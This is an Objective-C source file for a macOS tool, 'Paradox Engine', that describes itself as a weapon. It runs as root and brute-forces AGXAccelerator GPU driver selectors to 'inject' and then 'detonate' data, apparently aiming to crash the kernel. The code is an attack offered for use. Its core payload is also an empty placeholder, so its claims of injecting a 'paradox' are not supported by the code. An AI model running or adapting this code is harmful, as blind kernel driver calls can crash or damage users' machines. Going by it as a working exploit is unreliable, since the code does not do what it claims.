//
//  main.m
//  ParadoxCMD
//
//  Created by 이지안 on 6/9/25.
//

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurface.h>

// This is a complete, self-contained command-line tool.
int main(int argc, const char * argv[]) {
    @autoreleasepool {
        printf("[+] Paradox Engine (Standalone) Initializing...\n");
        
        if (getuid() != 0) {
            printf("[-] FATAL: This weapon must be wielded by a god. Run as root.\n");
            return -1;
        }
        printf("[+] Running with root privileges. The Great Filter is disabled.\n");

        // --- Step 1: Create a mundane, valid IOSurface ---
        NSDictionary *props = @{
            (NSString *)kIOSurfaceWidth: @(128),
            (NSString *)kIOSurfaceHeight: @(128),
            (NSString *)kIOSurfaceBytesPerElement: @(4),
            (NSString *)kIOSurfaceAllocSize: @(128 * 128 * 4)
        };
        IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)props);
        if (!surface) {
            printf("[-] FATAL: Failed to create base IOSurface.\n");
            return 1;
        }
        uint64_t surfaceId = IOSurfaceGetID(surface);
        printf("[+] Created mundane surface with ID: 0x%llx\n", surfaceId);
        
        // --- Step 2: Find the TRUE corrupting influence ---
        const char *trueName = "AGXAccelerator"; // Use the true name you found
        printf("[+] Seeking the true gate: %s\n", trueName);
        
        io_service_t gpuService = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching(trueName));
        if (!gpuService) {
            printf("[-] FATAL: Failed to find true-named service '%s'.\n", trueName);
            CFRelease(surface); return 1;
        }
        
        io_connect_t conn;
        kern_return_t kr = KERN_FAILURE;
        uint32_t successful_type = -1;
        for (uint32_t type = 0; type < 8; type++) {
             kr = IOServiceOpen(gpuService, mach_task_self(), type, &conn);
             if (kr == KERN_SUCCESS) {
                printf("[+] Successfully opened '%s' with type %u\n", trueName, type);
                successful_type = type;
                break;
             }
        }
        IOObjectRelease(gpuService);
        if (kr != KERN_SUCCESS) {
            printf("[-] FATAL: Failed to open GPU UserClient on any type.\n");
            CFRelease(surface); return 1;
        }

        // --- Step 3: Inject the Paradox ---
        printf("[+] Attempting to inject paradoxical metadata...\n");
        NSDictionary *paradoxicalProps = @{ /* ... Your paradoxical dictionary here ... */ };
        NSData *serializedParadox = [NSPropertyListSerialization dataWithPropertyList:paradoxicalProps format:NSPropertyListBinaryFormat_v1_0 options:0 error:nil];
        
        bool paradoxInjected = false;
        for (uint32_t selector = 0; selector < 50; selector++) {
            kr = IOConnectCallMethod(conn, selector, NULL, 0, [serializedParadox bytes], [serializedParadox length], NULL, 0, NULL, 0);
            if (kr == KERN_SUCCESS) {
                printf("[+] SUCCESS! Paradox injected via selector %u!\n", selector);
                paradoxInjected = true;
                break;
            }
        }
        
        if (!paradoxInjected) {
            printf("[-] Failed to inject paradox. No suitable selector found.\n");
            IOServiceClose(conn); CFRelease(surface); return 1;
        }

        // --- Step 4: Detonate ---
        printf("[+] Paradox injected. Attempting to detonate via hardware operation...\n");
        struct { uint64_t surfaceId; uint32_t command; } gpuCommand;
        gpuCommand.surfaceId = surfaceId;
        gpuCommand.command = 0xDEADBEEF;
        
        for (uint32_t selector = 0; selector < 50; selector++) {
            IOConnectCallStructMethod(conn, selector, &gpuCommand, sizeof(gpuCommand), NULL, 0);
        }
        
        printf("[+] Detonation signals sent. If the device is still alive, the paradox was caught.\n");
        IOServiceClose(conn);
        CFRelease(surface);
    }
    return 0;
}
